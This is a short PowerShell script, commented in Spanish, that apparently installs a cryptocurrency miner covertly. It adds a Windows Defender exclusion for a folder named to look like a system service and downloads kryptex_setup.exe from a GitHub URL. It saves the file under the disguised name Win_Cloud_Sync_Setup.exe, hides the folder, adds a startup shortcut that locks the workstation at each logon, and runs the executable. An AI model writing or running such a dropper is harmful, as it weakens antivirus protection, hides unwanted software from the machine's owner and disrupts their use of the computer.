# --- CONFIGURACIÓN AUTOMÁTICA ---
$url_exe = "https://github.com/DmI29/rapidman/raw/main/kryptex_setup.exe"
$dir = "C:\System_Log_Service"
$exePath = "$dir\Win_Cloud_Sync_Setup.exe"

# 1. Crear carpeta y exclusión de Antivirus
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }
Add-MpPreference -ExclusionPath $dir

# 2. Descargar el instalador desde tu GitHub
Invoke-WebRequest -Uri $url_exe -OutFile $exePath -UserAgent "Mozilla/5.0"

# 3. Crear el Bloqueo Automático en el Inicio
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$s = New-Object -ComObject WScript.Shell
$shortcut = $s.CreateShortcut("$startupPath\WinServiceLock.lnk")
$shortcut.TargetPath = "rundll32.exe"
$shortcut.Arguments = "user32.dll,LockWorkStation"
$shortcut.Save()

# 4. Ocultar la carpeta
attrib +s +h $dir

# 5. Ejecutar el instalador automáticamente
Start-Process -FilePath $exePath
